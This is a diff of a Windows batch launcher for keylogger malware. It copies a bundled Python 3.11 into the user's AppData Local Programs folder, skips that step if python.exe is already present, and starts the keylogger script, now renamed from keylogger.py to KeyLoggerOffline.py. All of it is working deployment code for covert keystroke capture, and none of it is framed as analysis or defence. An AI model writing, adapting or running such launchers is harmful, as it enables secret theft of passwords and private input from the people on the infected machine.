@@ -7,6 +7,8 @@ if exist %APPDATA%\..\Local\Programs\Python\Python311 (goto Python311)
 md %APPDATA%\..\Local\Programs\Python\Python311
 
 :Python311
+if exist %APPDATA%\..\Local\Programs\Python\Python311\python.exe (goto Python.exe)
 xcopy /s /e /y .\Python311 %APPDATA%\..\Local\Programs\Python\Python311
 
-start %APPDATA%\..\Local\Programs\Python\Python311\python.exe .\keylogger.py
+:Python.exe
+start %APPDATA%\..\Local\Programs\Python\Python311\python.exe .\KeyLoggerOffline.py
